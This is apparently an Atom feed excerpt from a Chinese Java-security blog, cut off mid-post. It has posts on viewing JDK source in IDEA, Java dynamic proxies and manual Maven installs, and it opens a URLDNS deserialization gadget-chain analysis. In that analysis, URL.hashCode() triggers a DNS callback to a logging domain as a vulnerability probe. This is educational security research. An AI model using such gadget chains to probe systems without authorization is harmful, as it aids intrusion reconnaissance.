    <link href="https://changeyourway.github.io/2024/05/12/Java%20%E5%AE%89%E5%85%A8/%E9%85%8D%E7%BD%AE%E7%AF%87-idea%E6%9F%A5%E7%9C%8BJDK%E5%92%8C%E4%BE%9D%E8%B5%96%E7%9A%84%E6%BA%90%E7%A0%81/"/>
    <id>https://changeyourway.github.io/2024/05/12/Java%20%E5%AE%89%E5%85%A8/%E9%85%8D%E7%BD%AE%E7%AF%87-idea%E6%9F%A5%E7%9C%8BJDK%E5%92%8C%E4%BE%9D%E8%B5%96%E7%9A%84%E6%BA%90%E7%A0%81/</id>
    <published>2024-05-12T10:16:39.906Z</published>
    <updated>2024-05-12T10:20:35.477Z</updated>
    
    <content type="html"><![CDATA[<p>前言：前面在分析初始版本 CC1 链的时候，查看 sun 包里的 AnnotationInvocationHandler 类的源码，发现变量名全都是 var 开头，非常不便于阅读，接下来将介绍如何使用 IDEA 查看带 sun 包的 JDK 源码，以及导入的依赖源码，这里的源码指的是 .java 文件。</p><span id="more"></span><h2 id="IDEA-查看带-sun-包的-JDK-源码"><a href="#IDEA-查看带-sun-包的-JDK-源码" class="headerlink" title="IDEA 查看带 sun 包的 JDK 源码"></a>IDEA 查看带 sun 包的 JDK 源码</h2><p>ref：<a href="https://quan9i.top/post/Java%20CC1/">JAVA CC1分析</a> </p><p>原始的 JDK 中的 src.zip 是没有 sun 包的，我们需要自己下载包含 sun 包的源码。</p><p>以 JDK8u65 版本为例，前往 openjdk 网站下载的链接为：<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p>点击左侧的 zip 即可下载压缩包：</p><img src="/images/image-20240512103415395.png"><p>下载的压缩包名为 jdk-af660750b2f4.zip ，将其解压后，在 <code>jdk-af660750b2f4\jdk-af660750b2f4\src\share\classes</code> 路径下即可找到 sun 包：</p><img src="/images/image-20240512103638591.png"><p>在我们之前的 JDK 文件夹下有一个 src.zip 压缩包，将其解压后，将上面的 sun 包复制进来：</p><img src="/images/image-20240512103849057.png"><p>这时候就可以在 idea 中添加资源文件了。</p><p>打开 idea -&gt; ProJect Structure -&gt; SDKs 选择上方的 Classpath ，点击加号，将 src 路径导入进去：</p><img src="/images/image-20240512104333634.png"><p>添加完 Classpath 之后，还要添加 Sourcepath ：</p><img src="/images/image-20240512104500613.png"><p>这样就算完成了。</p><p>这时就可以写个程序验证是否添加成功：</p><img src="/images/image-20240512104723731.png"><p>Ctrl + 鼠标左键进入源码：</p><img src="/images/image-20240512104759127.png"><p>可以发现此时进入的是 .java 文件而不再是 .class 文件了，说明添加成功。</p><h2 id="IDEA-查看依赖包的-Java-源码"><a href="#IDEA-查看依赖包的-Java-源码" class="headerlink" title="IDEA 查看依赖包的 Java 源码"></a>IDEA 查看依赖包的 Java 源码</h2><p>ref：<a href="https://blog.csdn.net/qq_41937438/article/details/102633266">idea 查看 Java 源码，而不是编译后的 class 文件</a> </p><p>以 CC 依赖为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>首先打开设置，找到红框所示路径，勾选 Sources 和 Documentation ：</p><img src="/images/image-20240512105017896.png"><p>点击 Apply 应用和 OK 退出。</p><p>接着打开右侧 Maven 图标，按照图示步骤 Download Sources ：</p><img src="/images/image-20240512105304562.png"><p>到这一步就添加完成了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前言：前面在分析初始版本 CC1 链的时候，查看 sun 包里的 AnnotationInvocationHandler 类的源码，发现变量名全都是 var 开头，非常不便于阅读，接下来将介绍如何使用 IDEA 查看带 sun 包的 JDK 源码，以及导入的依赖源码，这里的源码指的是 .java 文件。&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>基础篇 - Java 动态代理</title>
    <link href="https://changeyourway.github.io/2024/05/11/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <id>https://changeyourway.github.io/2024/05/11/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</id>
    <published>2024-05-11T11:41:10.919Z</published>
    <updated>2024-05-11T11:48:48.117Z</updated>
    
    <content type="html"><![CDATA[<p>在 Java 动态代理中，代理对象能够通过调用 invoke 方法来增强被代理对象的原始方法。</p><span id="more"></span><h2 id="Java-动态代理"><a href="#Java-动态代理" class="headerlink" title="Java 动态代理"></a>Java 动态代理</h2><h4 id="程序为什么需要代理？代理长什么样？"><a href="#程序为什么需要代理？代理长什么样？" class="headerlink" title="程序为什么需要代理？代理长什么样？"></a>程序为什么需要代理？代理长什么样？</h4><p>对象如果嫌身上干的事太多，可以通过代理来转移部分职责。对象有什么方法想被代理，代理就一定要有对应的方法。</p><h4 id="下面通过一个简单的例子来了解动态代理"><a href="#下面通过一个简单的例子来了解动态代理" class="headerlink" title="下面通过一个简单的例子来了解动态代理"></a>下面通过一个简单的例子来了解动态代理</h4><p>现有一个类 BigStar 需要被代理，如何让代理类知道 BigStar 的哪些方法需要被代理呢？那么需要定义一个接口，这个接口将会声明 BigStar 中需要被代理的方法，再让代理类实现这个接口好了。同样，出于代理的规范，BigStar 类也需要实现这个接口。</p><p><strong>需要被代理的 BigStar 类：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class BigStar implements Star&#123;</span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    public BigStar(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String Sing(String name)&#123;</span><br><span class="line">        System.out.println(this.name + &quot;正在唱&quot; + name);</span><br><span class="line">        return &quot;谢谢大家！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void Dance()&#123;</span><br><span class="line">        System.out.println(this.name + &quot;正在跳舞&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Star 接口中声明了 BigStar 类需要被代理的方法 Sing 和 Dance ：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public interface Star &#123;</span><br><span class="line">    String Sing(String name);</span><br><span class="line">    public void Dance();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们要获取代理对象，通常用到 Proxy 类的 newProxyInstance() 方法。</p><h4 id="Proxy-newProxyInstance-方法"><a href="#Proxy-newProxyInstance-方法" class="headerlink" title="Proxy.newProxyInstance() 方法"></a>Proxy.newProxyInstance() 方法</h4><p>其定义是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@CallerSensitive</span><br><span class="line">public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span><br></pre></td></tr></table></figure><ul><li><p>返回类型为 Object </p></li><li><p>第一个参数用于指定类加载器，开发里都是用当前类的类加载器，这里即 ProxyUtil.class.getClassLoader() 。</p></li><li><p>第二个参数需要传入一个接口数组，用于指定生成的代理对象继承哪些接口，包含哪些方法。</p></li><li><p>第三个参数需要传入一个 InvocationHandler 接口的对象，由于接口不能直接实例化对象，所以我们这里需要用到 InvocationHandler 接口的匿名对象。</p></li></ul><p>具体代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Star starProxy = (Star) Proxy.newProxyInstance(</span><br><span class="line">                // 指定类加载器</span><br><span class="line">                ProxyUtil.class.getClassLoader(),</span><br><span class="line">                // 传入接口的Class对象</span><br><span class="line">                new Class[]&#123;Star.class&#125;,</span><br><span class="line">                // 传入InvocationHandler接口的匿名对象</span><br><span class="line">                new InvocationHandler() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">                        return null;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p>在使用 idea 创建 InvocationHandler 的匿名内部类时我们会发现这里自动生成了一个重写的 invoke() 方法，划重点，这个 invoke() 方法很重要。</p><h4 id="InvocationHandler-类的-invoke-方法"><a href="#InvocationHandler-类的-invoke-方法" class="headerlink" title="InvocationHandler 类的 invoke() 方法"></a>InvocationHandler 类的 invoke() 方法</h4><p>代理对象需要做的增强功能（或者说要做的事情），就定义在这个方法里。</p><p>我们来看它的定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public Object invoke(Object proxy, Method method, Object[] args)</span><br></pre></td></tr></table></figure><p>这三个参数的含义是什么呢？</p><p>我们知道，我们获取到的这个代理对象 starProxy 中是有 Sing 和 Dance 两个方法的，而且将来会被调用，就像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">starProxy.Sing(&quot;爱我中华&quot;)</span><br></pre></td></tr></table></figure><p>那么此时第一个参数 proxy 获取到的就是对象 starProxy ，第二个参数 method 获取到的就是方法 Sing ，第三个参数 args 获取到的就是参数数组 Object[]{“爱我中华”} ，应该明白了吧。</p><p>那么接下来我们可以完善这个 invoke 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// 新建一个 BigStar 对象</span><br><span class="line">BigStar bigStar = new BigStar(&quot;张三&quot;);</span><br><span class="line">// 创建代理对象</span><br><span class="line">Star starProxy = (Star) Proxy.newProxyInstance(</span><br><span class="line">                // 指定类加载器</span><br><span class="line">                ProxyUtil.class.getClassLoader(),</span><br><span class="line">                // 传入接口的Class对象</span><br><span class="line">                new Class[]&#123;Star.class&#125;,</span><br><span class="line">                // 传入InvocationHandler接口的匿名对象</span><br><span class="line">                new InvocationHandler() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">                        // 当调用 Sing 方法时，打印 &quot;收钱，准备唱歌场地&quot;</span><br><span class="line">                        if (method.getName().equals(&quot;Sing&quot;)) &#123;</span><br><span class="line">                            System.out.println(&quot;收钱，准备唱歌场地&quot;);</span><br><span class="line">                        // 当调用 Dance 方法时，打印 &quot;收钱，准备跳舞场地&quot;</span><br><span class="line">                        &#125; else if (method.getName().equals(&quot;Dance&quot;)) &#123;</span><br><span class="line">                            System.out.println(&quot;收钱，准备跳舞场地&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                        // 最后一定调用 bigStar 的原始方法，并将结果返回</span><br><span class="line">                        return method.invoke(bigStar, args);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p>最后调用代理类的 Sing 和 Dance 方法测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String sing = starProxy.Sing(&quot;爱我中华&quot;);</span><br><span class="line">System.out.println(sing);</span><br><span class="line">starProxy.Dance();</span><br></pre></td></tr></table></figure><p>返回结果如下：</p><img src="/images/image-20240511191727576.png"><p>最后我们再梳理一遍执行流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">starProxy.Sing(&quot;爱我中华&quot;) -&gt; InvocationHandler 的 invoke 方法（打印 &quot;收钱，准备唱歌场地&quot;） -&gt; bigStar.Sing(&quot;爱我中华&quot;)（并将返回值返回）</span><br></pre></td></tr></table></figure><p>starProxy.Dance() 同理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">starProxy.Dance() -&gt; InvocationHandler 的 invoke 方法（打印 &quot;收钱，准备跳舞场地&quot;） -&gt; bigStar.Dance()（无返回）</span><br></pre></td></tr></table></figure><p>至此，我们对动态代理有了大概的了解。</p><p>不过，实际开发中，我们通常会自定义一个 ProxyUtil 工具类来获取代理对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class ProxyUtil &#123;</span><br><span class="line">    public static Star createProxy(BigStar bigStar) &#123;</span><br><span class="line">        Star starProxy = (Star) Proxy.newProxyInstance(</span><br><span class="line">                // 指定类加载器</span><br><span class="line">                ProxyUtil.class.getClassLoader(),</span><br><span class="line">                // 传入接口的Class对象</span><br><span class="line">                new Class[]&#123;Star.class&#125;,</span><br><span class="line">                // 传入InvocationHandler接口的匿名对象</span><br><span class="line">                new InvocationHandler() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">                        // 当调用 Sing 方法时，打印 &quot;收钱，准备唱歌场地&quot;</span><br><span class="line">                        if (method.getName().equals(&quot;Sing&quot;)) &#123;</span><br><span class="line">                            System.out.println(&quot;收钱，准备唱歌场地&quot;);</span><br><span class="line">                        // 当调用 Dance 方法时，打印 &quot;收钱，准备跳舞场地&quot;</span><br><span class="line">                        &#125; else if (method.getName().equals(&quot;Dance&quot;)) &#123;</span><br><span class="line">                            System.out.println(&quot;收钱，准备跳舞场地&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                        // 最后一定调用 bigStar 的原始方法</span><br><span class="line">                        return method.invoke(bigStar, args);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">        return starProxy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如此一来，我们的测试类中就可以这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 获取代理对象</span><br><span class="line">        Star starProxy = ProxyUtil.createProxy(new BigStar(&quot;张三&quot;));</span><br><span class="line">        String sing = starProxy.Sing(&quot;爱我中华&quot;);</span><br><span class="line">        System.out.println(sing);</span><br><span class="line">        starProxy.Dance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就简洁很多了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在 Java 动态代理中，代理对象能够通过调用 invoke 方法来增强被代理对象的原始方法。&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>配置篇 - Maven 手动下载与导入依赖</title>
    <link href="https://changeyourway.github.io/2024/05/10/Java%20%E5%AE%89%E5%85%A8/%E9%85%8D%E7%BD%AE%E7%AF%87-Maven%E6%89%8B%E5%8A%A8%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AF%BC%E5%85%A5%E4%BE%9D%E8%B5%96/"/>
    <id>https://changeyourway.github.io/2024/05/10/Java%20%E5%AE%89%E5%85%A8/%E9%85%8D%E7%BD%AE%E7%AF%87-Maven%E6%89%8B%E5%8A%A8%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AF%BC%E5%85%A5%E4%BE%9D%E8%B5%96/</id>
    <published>2024-05-10T11:53:40.081Z</published>
    <updated>2024-05-10T12:32:53.757Z</updated>
    
    <content type="html"><![CDATA[<p>遇到 maven 无法自动导入的依赖怎么办，本文介绍了如何手动下载与导入 maven 依赖</p><span id="more"></span><h5 id="遇到-maven-无法自动导入的依赖怎么办"><a href="#遇到-maven-无法自动导入的依赖怎么办" class="headerlink" title="遇到 maven 无法自动导入的依赖怎么办"></a>遇到 maven 无法自动导入的依赖怎么办</h5><p>推荐博客：<a href="https://blog.csdn.net/weixin_44455388/article/details/100926697">maven 项目手动导入 jar 包依赖</a></p><h6 id="第一步，在网上下载依赖-jar-包"><a href="#第一步，在网上下载依赖-jar-包" class="headerlink" title="第一步，在网上下载依赖 jar 包"></a>第一步，在网上下载依赖 jar 包</h6><p>比较推荐 nowjava （时代java）这个网站。</p><p>比如我要下载 javax.el-api-3.0.0.jar ，那么访问网址 <a href="https://nowjava.com/jar/detail/m03040939/javax.el-api-3.0.0.jar.html">https://nowjava.com/jar/detail/m03040939/javax.el-api-3.0.0.jar.html</a> 即可，往下翻，有下载 jar 包的链接：</p><img src="/images/image-20240428112425221.png"><p>下载好之后复制文件路径：”C:\Users\miaoj\Downloads\javax.el-api-3.0.0.jar” 。</p><h6 id="第二步，idea-中导入-jar-包"><a href="#第二步，idea-中导入-jar-包" class="headerlink" title="第二步，idea 中导入 jar 包"></a>第二步，idea 中导入 jar 包</h6><p>file &#x3D;&gt; project Structure &#x3D;&gt; modules &#x3D;&gt; Dependencies &#x3D;&gt; 点击加号 &#x3D;&gt; 选择第一项 JARs or Directories</p><img src="/images/image-20240428112831198.png"><p>将文件地址粘贴进去，确定即可。</p><h6 id="第三步，将-jar-包手动添加到-maven-本地仓库中"><a href="#第三步，将-jar-包手动添加到-maven-本地仓库中" class="headerlink" title="第三步，将 jar 包手动添加到 maven 本地仓库中"></a>第三步，将 jar 包手动添加到 maven 本地仓库中</h6><p>打开 idea 的 Terminal 终端进入 Windows 命令提示符，输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file -Dfile=&quot;C:\Users\miaoj\Downloads\javax.el-api-3.0.0.jar&quot; -DgroupId=javax.el -DartifactId=javax.el-api -Dversion=3.0.0 -Dpackaging=jar</span><br></pre></td></tr></table></figure><p>-DgroupId：pom 文件中的 groupId </p><p>-DartifactId：pom 文件中的 artifactId </p><p>-Dversion：pom 文件中的 version </p><p>-Dpackaging：导入包的类型，这里是 jar 类型</p><p>-Dfile：jar 包所在路径</p><p>在执行结果中可以看到 jar 包已被导入 maven 本地仓库：</p><img src="/images/image-20240428113523947.png"><p>完成之后，查看 pom.xml 文件可以发现原来的依赖不再爆红：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;javax.el&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;javax.el-api&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;3.0.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;遇到 maven 无法自动导入的依赖怎么办，本文介绍了如何手动下载与导入 maven 依赖&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - URLDNS 利用链分析</title>
    <link href="https://changeyourway.github.io/2024/05/10/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://changeyourway.github.io/2024/05/10/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2024-05-10T11:53:40.080Z</published>
    <updated>2024-05-10T12:31:43.369Z</updated>
    
    <content type="html"><![CDATA[<p>本文详尽地讲述了 URLDNS 反序列化利用链的原理</p><span id="more"></span><h2 id="URLDNS-利用链分析"><a href="#URLDNS-利用链分析" class="headerlink" title="URLDNS 利用链分析"></a>URLDNS 利用链分析</h2><p>推荐博客：<a href="https://xz.aliyun.com/t/9116?time__1311=n4+xuDgD9DyDnDfhx0xxBqDwp0Ytunew+4GQ734D&alichlgref=https://www.google.com/">JAVA反序列化-ysoserial-URLDNS原理分析</a> </p><p>URLDNS 反序列化利用链的结果就是发起一次 URL 请求，在 DNS 服务器上留下一条解析记录，常常作为验证漏洞是否存在的手段。</p><h4 id="具体的利用点在-URL-类的-hashcode-函数中"><a href="#具体的利用点在-URL-类的-hashcode-函数中" class="headerlink" title="具体的利用点在 URL 类的 hashcode 函数中"></a>具体的利用点在 URL 类的 hashcode 函数中</h4><p><strong>在 Java 中，hashCode() 是 Object 类中的一个方法，用于返回一个对象的哈希码（hash code），该哈希码是一个 int 类型的数值，代表了该对象的特定标识符。 哈希码的主要作用是在集合中进行元素的快速查找，比如在 HashMap 和 HashSet 中。</strong> </p><p>先来看一个简单的示例：</p><p>首先在 Yakit 上生成一个可用域名：ihqkfolumv.dgrh3.cn</p><img src="/images/image-20240502110230821.png"><p>写好如下 Java 程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws MalformedURLException &#123;</span><br><span class="line">        // 调用URL类的hashCode方法发起DNS请求</span><br><span class="line">        URL url = new URL(&quot;http://ihqkfolumv.dgrh3.cn&quot;);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，ihqkfolumv.dgrh3.cn 是我们自己生成的域名，用于被 Java 程序访问，这样在 DNS 服务器上就会留下一条访问记录。</p><p>运行后在 Yakit 这里会留下一条解析记录：</p><img src="/images/image-20240502110456487.png"><h4 id="下面来查看源代码了解原理"><a href="#下面来查看源代码了解原理" class="headerlink" title="下面来查看源代码了解原理"></a>下面来查看源代码了解原理</h4><p><strong>Ctrl + 鼠标左键点击进入 URL 类的 hashcode 方法：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">    if (hashCode != -1)</span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(this);</span><br><span class="line">    return hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里先做了一个判断，然后调用了 handler 的 hashCode 方法。而 handler 是 URL 类中定义的一个属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transient URLStreamHandler handler;</span><br></pre></td></tr></table></figure><p><strong>接着 Ctrl + 鼠标左键点击进入 handler 对象（也即 URLStreamHandler 类）的 hashcode 方法：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">protected int hashCode(URL u) &#123;</span><br><span class="line">    int h = 0;</span><br><span class="line"></span><br><span class="line">    // Generate the protocol part.</span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    if (protocol != null)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    // Generate the host part.</span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">    if (addr != null) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        String host = u.getHost();</span><br><span class="line">        if (host != null)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Generate the file part.</span><br><span class="line">    String file = u.getFile();</span><br><span class="line">    if (file != null)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    // Generate the port part.</span><br><span class="line">    if (u.getPort() == -1)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    else</span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    // Generate the ref part.</span><br><span class="line">    String ref = u.getRef();</span><br><span class="line">    if (ref != null)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    return h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法传入一个 URL 类作为参数，依次通过调用 getProtocol ，getHostAddress，getFile，getPort，getRef 等方法获取到传入的 URL 链接的 Protocol（协议），HostAddress（主机地址），File（文件路径），Port（端口），Ref（锚点，即 # 后面的部分），获取完之后，对每部分调用它们的 hashCode 方法，将结果加到 h 上，最后将 h 返回。</p><p>不过，我们需要重点关注的是 getHostAddress 方法，该方法会返回一个 IP 地址，如果遇到的是域名，那么就需要发起 DNS 请求来将其解析成 IP 地址。</p><p><strong>Ctrl + 鼠标左键点击进入 getHostAddress 方法：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">protected synchronized InetAddress getHostAddress(URL u) &#123;</span><br><span class="line">    if (u.hostAddress != null)</span><br><span class="line">        return u.hostAddress;</span><br><span class="line"></span><br><span class="line">    String host = u.getHost();</span><br><span class="line">    if (host == null || host.equals(&quot;&quot;)) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; catch (UnknownHostException ex) &#123;</span><br><span class="line">            return 